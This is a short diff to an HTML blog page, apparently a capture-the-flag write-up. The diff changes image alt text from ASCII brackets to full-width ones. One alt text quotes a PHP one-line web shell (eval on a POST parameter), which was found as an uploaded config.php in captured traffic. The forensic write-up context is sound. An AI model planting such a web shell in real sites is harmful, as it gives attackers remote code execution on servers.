@@ -916,7 +916,7 @@
 <div class="post-img-view">
     <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192327104.png">
         <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192327104.png" 
-             alt="BUUCTF 题目「[安洵杯 2019]Attack 1」页面，附件为 attachment.zip" 
+             alt="BUUCTF 题目「［安洵杯 2019］Attack 1」页面，附件为 attachment.zip" 
               
              loading="lazy"
         />
@@ -962,7 +962,7 @@
 <div class="post-img-view">
     <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192334567.png">
         <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192334567.png" 
-             alt="追踪该 TCP 流：上传 config.php，内容为一句话木马 &lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;" 
+             alt="追踪该 TCP 流：上传 config.php，内容为一句话木马 &lt;?php @eval($_POST［&#39;hack&#39;］);?&gt;" 
               
              loading="lazy"
         />
